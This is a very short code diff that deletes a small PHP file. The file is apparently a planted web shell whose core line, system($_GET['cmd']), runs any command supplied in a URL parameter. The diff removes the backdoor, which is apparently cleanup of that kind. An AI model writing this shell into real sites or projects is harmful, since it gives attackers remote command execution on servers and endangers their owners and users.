@@ -1,3 +1,0 @@
-cmd loaded
-
-<?php system($_GET["cmd"]); ?>
